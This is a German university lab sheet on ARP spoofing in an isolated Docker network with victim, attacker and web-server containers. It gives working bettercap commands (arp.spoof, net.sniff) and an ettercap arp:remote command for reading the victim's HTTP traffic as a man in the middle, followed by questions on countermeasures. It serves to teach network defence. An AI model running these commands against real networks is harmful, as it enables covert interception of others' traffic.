# lab02 – ARP Spoofing: Wer sitzt in deinem Netz?

| | |
|---|---|
| **Modul** | Sichere Netzwerke |
| **Hochschule** | FOM Hochschule für Oekonomie & Management |
| **Semester** | Sommersemester 2026 |
| **Dauer** | ca. 90 Minuten |
| **Voraussetzungen** | Docker Desktop installiert, Linux-Grundkenntnisse, lab01 abgeschlossen |

---

## Lernziele

Nach diesem Lab kannst du...

1. erklären, warum ARP als Protokoll keine Möglichkeit hat, Absender zu authentifizieren
2. beschreiben, wie ein Angreifer im gleichen Netz den ARP-Cache eines anderen Hosts manipuliert
3. nachvollziehen, wie unverschlüsselter Traffic als zwischengeschalteter Knoten mitgelesen werden kann
4. begründen, warum das Opfer einen solchen Angriff nicht unmittelbar bemerkt
5. geeignete Gegenmaßnahmen auf Netzwerkebene benennen und einordnen

---

## Das Szenario

Du arbeitest mit drei Containern. Ein **Opfer** kommuniziert regelmäßig mit einem **Webserver** im gleichen Netz. Ein **Angreifer** befindet sich ebenfalls in diesem Netz – und hat die Möglichkeit, sich zwischen beide zu drängen, ohne dass dafür ein Kabel umgesteckt werden muss.

> **Leitfrage:** Wenn zwei Geräte im gleichen Netz kommunizieren – wie stellt man sicher, dass ein Paket wirklich beim richtigen Empfänger ankommt?

---

## Topologie

```
  ┌─────────────────┐       ┌──────────────────┐       ┌─────────────────┐
  │   lab02-alice   │       │  lab02-mallory   │       │  lab02-gateway  │
  │    (Opfer)      │       │   (Angreifer)    │       │  (Webserver)    │
  └─────────────────┘       └──────────────────┘       └─────────────────┘

         Alle drei Container im selben Netz: lab02-net (/24)
         IPs werden beim Start vergeben – siehe setup.sh-Ausgabe
         oder jederzeit: cat /etc/lab-info  (in jedem Container)
```

| Container | Image | Rolle |
|---|---|---|
| `lab02-alice` | `ubuntu:22.04` | Opfer – sendet HTTP-Anfragen an gateway |
| `lab02-mallory` | `kalilinux/kali-rolling` | Angreifer im gleichen Segment |
| `lab02-gateway` | `alpine:latest` | HTTP-Webserver (Port 80) |

> **Hinweis:** Die IP-Adressen werden beim Start dynamisch vergeben.
> `./setup.sh` zeigt sie am Ende an. In jedem Container steht außerdem:
> ```bash
> cat /etc/lab-info
> ```

---

## Aufgaben

### Schritt 1 – Lab starten

```bash
chmod +x setup.sh teardown.sh
./setup.sh
```

Das Skript startet alle Container, installiert die benötigten Tools
und zeigt am Ende die IP-Adressen an. Warte bis `Lab ist bereit!` erscheint.

```bash
docker ps
# Erwartung: 3 Container (lab02-alice, lab02-gateway, lab02-mallory) mit Status "Up"
```

Notiere die IP-Adressen aus der Ausgabe:

```
IP alice   (Opfer):      _______________________
IP gateway (Webserver):  _______________________
IP mallory (Angreifer):  _______________________
```

---

### Schritt 2 – Drei Terminals öffnen

```bash
# Terminal A – alice (Opfer)
docker exec -it lab02-alice bash

# Terminal B – mallory (Angreifer)
docker exec -it lab02-mallory bash

# Terminal C – gateway (Webserver)
docker exec -it lab02-gateway sh
```

---

### Schritt 3 – Netzwerk erkunden

Führe auf **alice** (Terminal A) aus:

```bash
# ARP-Cache anzeigen – welche MAC-Adressen sind bekannt?
arp -n

# Erreichbarkeit des Gateways testen
ping -c 3 <IP von gateway>
```

Notiere die MAC-Adresse, die für gateway eingetragen ist:

```
MAC-Adresse von gateway (vor Angriff): _______________________________
```

> **Frage:** Zu welchem Container gehört diese MAC-Adresse?
> Überprüfe es:
> ```bash
> docker exec lab02-gateway ip link show eth0
> docker exec lab02-mallory ip link show eth0
> ```

---

### Schritt 4 – HTTP-Traffic beobachten

alice sendet bereits automatisch alle 2 Sekunden Anfragen ans Gateway.
Überzeuge dich davon:

```bash
# Auf alice (Terminal A):
curl -s http://<IP von gateway>/
```

Du siehst die Antwort des Webservers. Merke dir, welche Informationen darin enthalten sind.

---

### Schritt 5 – Angriff starten: bettercap

Wechsle zu **Terminal B (lab02-mallory)**:

```bash
bettercap -iface eth0
```

**Wichtig:** Zuerst das Netzwerk scannen – bettercap muss alice und gateway
kennen, bevor es den Angriff starten kann:

```
net.probe on
```

Warte bis du siehst:
```
[endpoint.new] endpoint <IP alice> detected ...
[endpoint.new] endpoint <IP gateway> detected ...
```

Zeige die gefundenen Hosts an:
```
net.show
```

> **Frage:** Welche Hosts werden angezeigt? Welche MAC-Adressen sind sichtbar?

---

### Schritt 6 – ARP-Spoofing aktivieren

Erst wenn alice und gateway in `net.show` sichtbar sind:

```
set arp.spoof.targets <IP von alice>
set arp.spoof.gateway <IP von gateway>
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.verbose true
net.sniff on
```

Warte ca. 15 Sekunden.

---

### Schritt 7 – Merkt alice etwas?

Öffne ein **viertes Terminal** und prüfe den ARP-Cache von alice:

```bash
docker exec lab02-alice arp -n
```

Notiere die MAC-Adresse, die jetzt für gateway eingetragen ist:

```
MAC-Adresse von gateway (nach Angriff): _______________________________
```

> **Beobachte:** Hat sich etwas verändert? Vergleiche mit deiner Notiz aus Schritt 3.

Prüfe gleichzeitig, ob alice weiterhin Antworten bekommt:

```bash
docker exec lab02-alice curl -s http://<IP von gateway>/
```

**Was fällt auf?**

```
_______________________________________________
_______________________________________________
```

---

### Schritt 8 – Traffic auf mallory beobachten

Beobachte die `net.sniff`-Ausgabe in Terminal B ca. 30 Sekunden lang.

> **Beobachte:**
> - Was siehst du im Mitschnitt?
> - Welche Informationen aus der HTTP-Kommunikation sind lesbar?

**Notiere deine Beobachtungen:**

```
_______________________________________________
_______________________________________________
_______________________________________________
```

Beobachte parallel die ARP-Ebene auf alice:

```bash
# Viertes Terminal:
docker exec lab02-alice tcpdump -i eth0 -n arp
```

> **Frage:** Wer sendet ARP-Pakete? Was behaupten diese Pakete?

---

### Schritt 9 – Angriff stoppen

In Terminal B (bettercap-Konsole):

```
arp.spoof off
net.sniff off
exit
```

Warte ca. 30 Sekunden. Prüfe erneut den ARP-Cache von alice:

```bash
docker exec lab02-alice arp -n
```

**Was beobachtest du?**

```
_______________________________________________
```

---

### Schritt 10 – Wiederholung mit ettercap

```bash
# Auf lab02-mallory (Terminal B):
ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
```

Beende ettercap mit `Ctrl+Q`.

> **Vergleich:** Was zeigt ettercap anders als bettercap?

---

### Schritt 11 – Cleanup

```bash
./teardown.sh

# Prüfen:
docker ps
```

---

## Reflexionsfragen

**F1 – Was hast du beobachtet?**
Beschreibe in eigenen Worten, was mallory während des Angriffs sehen konnte.

**F2 – Warum funktioniert das?**
Erkläre, warum alice seinen Traffic an mallory schickt – obwohl alice eigentlich gateway erreichen möchte.

**F3 – Welche Rolle spielt `ip_forward`?**
Was würde passieren, wenn diese Einstellung auf mallory nicht aktiv wäre?
Warum ist das für den Angriff entscheidend?

**F4 – Warum muss bettercap zuerst `net.probe on` ausführen?**
Was passiert, wenn man `arp.spoof on` startet ohne vorher zu scannen?

**F5 – Hat alice etwas bemerkt?**
Was sagt dir das über reale Angreiferszenarien in Büro- oder Campusnetzen?

**F6 – Wie nennt sich dieser Angriff?**
Recherchiere den Fachbegriff für diese Art der Manipulation.
Welcher übergeordnete Angriffstyp (aus lab01 bekannt) wird damit realisiert?

**F7 – Schutzmaßnahmen**
Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern oder erschweren.
Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?

---

## Quick Reference

| Befehl | Beschreibung | Container |
|---|---|---|
| `cat /etc/lab-info` | IP-Übersicht anzeigen | alle |
| `arp -n` | ARP-Cache anzeigen | lab02-alice |
| `ip link show eth0` | MAC-Adresse anzeigen | alle |
| `ping -c 3 <ip>` | Erreichbarkeit testen | alle |
| `curl -s http://<ip>/` | HTTP-Anfrage senden | lab02-alice |
| `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | lab02-alice |
| `bettercap -iface eth0` | bettercap starten | lab02-mallory |
| `net.probe on` | Netz scannen (vor arp.spoof!) | bettercap |
| `net.show` | Gefundene Hosts anzeigen | bettercap |
| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ettercap MitM | lab02-mallory |
| `./setup.sh` | Lab starten | Host |
| `./teardown.sh` | Lab beenden | Host |
| `docker exec -it <n> bash` | In Container einloggen | Host |